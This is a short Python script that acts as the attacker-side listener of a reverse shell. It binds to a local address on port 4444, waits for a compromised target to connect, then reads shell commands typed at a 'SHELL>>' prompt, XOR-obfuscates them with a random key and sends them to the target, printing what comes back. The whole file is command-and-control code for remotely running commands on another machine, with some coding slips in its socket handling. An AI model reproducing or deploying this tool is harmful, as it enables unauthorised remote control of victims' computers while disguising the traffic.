import  socket,random,string

# use XOR 

def str_xor(s1,s2):
    return ''.join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

def connect(key):
    s = socket.socket()
    s.bind(('192.168.1.4', 4444))
    s.listen(1)          #max number of incomming connections
    conn , addr = s.accept()   # accept inbound connection
    print('[+] we got a connection from' , addr)

    while 1:
        command = input("SHELL>> ")
        if 'terminate' in command:
            s.send(' terminate'.encode())
            s.close()
        # target should receive the commands 
        # assume that target is executing the commands and send back the result
        else:
            result = str_xor(command,key)
            conn.send(result.encode())
            print(conn.recv(1024).decode())
            # 1024 bytes ---> 1 kb

def main():
    key = ''.join(random.choice(string.ascii_lowercase +
        string.ascii_uppercase + '><?|]!@#$%^&*();,_-') for _ in range(0,1024))
    print(key)
    connect(key)
main()
